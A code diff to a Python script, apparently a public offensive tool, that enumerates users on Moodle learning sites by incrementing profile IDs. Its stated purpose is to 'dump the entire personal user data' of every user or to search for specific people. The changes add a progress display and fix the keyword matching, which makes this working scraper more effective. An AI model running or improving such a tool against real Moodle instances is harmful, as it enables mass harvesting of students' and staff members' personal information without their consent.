@@ -28,6 +28,7 @@ class UserEnumerator:
         self.output_dir = output
         self.lock_file_io = Lock()
         self.output_lock = Lock()
+        self.current_status_line = None
 
     def start(self):
         # LOGIN
@@ -77,6 +78,7 @@ class UserEnumerator:
 
     def stop(self):
         self.id_now = -99
+        self.erase_current_line()
         self.draw_separator()
         print("Threads stopped\nLogging out...")
         url = "{}/login/logout.php?sesskey={}".format(self.url,self.logout_key)
@@ -107,9 +109,21 @@ class UserEnumerator:
 
     def print_single_profile(self,profile_info):
         with self.output_lock:
+            self.erase_current_line()
             print("\n" + "#"*20)
             for key,value in profile_info.items():
                 print("{} : {}".format(key,value))
+
+    def erase_current_line(self):
+        if self.current_status_line is not None:
+            print("\r" + " "*(len(self.current_status_line)) + "\r",end="")
+
+    def print_status(self,now_id,now_name):
+        progress_percentage = ((now_id-self.id_range[0]+1)/(self.id_range[1]-self.id_range[0]+1)*100)
+        with self.output_lock:
+            self.erase_current_line()
+            self.current_status_line = "Searching '{}' / ID: {} / Progress: {:.2f}%".format(now_name,now_id, progress_percentage)
+            print(self.current_status_line, end="")
 
     def thread_func(self):
         profile_page_prefix = "{}/user/profile.php?id=".format(self.url)
@@ -130,6 +144,8 @@ class UserEnumerator:
                 value = dl.find_all("dd")[0].text
                 profile_info[key] = value
 
+            self.print_status(next_id,profile_info["Name"])
+
             if len(self.search_keywords.keys()) == 0:
                 # DUMP ALL
                 self.write_single_profile(profile_info)
@@ -138,13 +154,15 @@ class UserEnumerator:
             else:
                 # SEARCH
                 for each_search_term,each_search_keyword_list in self.search_keywords.items():
+                    found = False
                     try:
                         target = profile_info[each_search_term]
                         search_items = [to_check.lower() for to_check in each_search_keyword_list.split(",")]
                         for search_item in search_items:
-                            if target.lower() in search_item:
+                            if search_item in target.lower() and not found:
                                 self.write_single_profile(profile_info)
                                 self.print_single_profile(profile_info)
+                                found = True
                     except:
                         pass
         return
@@ -159,7 +177,7 @@ print(r"""
 
 # ARGS
 parser = ArgumentParser(epilog="Author: CaptainWoof (https://www.twitter.com/realCaptainWoof)",
-                        description="""A python script that lets you dump the entire personal user data (short of the passwords) or search for a particular user on a site running on Moodle CMS, by exploiting the fact that Moodle is vulnerable to a simple user enumeration scan by id incrementation.""")
+                        description="""A python script that lets you dump the entire personal user data (short of the passwords)  or search for a particular user, by taking advantage of the fact that Moodle is vulnerable to a simple user enumeration scan by id incrementation, given that you are authenticated.""")
 
 parser.add_argument("-m","--mode",action='store',type=str,choices=['S','D'],required=True,help="Search for single user/Dump all users (S/D)")
 parser.add_argument("-u","--url",action='store',type=str,required=True,help="Moodle CMS's homepage url (prepended with http/s)")
@@ -167,8 +185,9 @@ parser.add_argument("-ids","--id_range",action='store',type=str,required=False,h
 parser.add_argument("-t","--threads",action='store',type=int,required=False,help="Max number of concurrent threads to use",default=30)
 parser.add_argument("-o","--output",action="store",type=str,required=False,help="Output directory ('cur' for current-directory): ")
 args = parser.parse_args()
-if args.output.lower() == 'cur':
-    args.output = os.getcwd()
+if args.output is not None:
+    if args.output.lower() == 'cur':
+        args.output = os.getcwd()
 search_keywords = {}
 
 # CHOICE ARGS
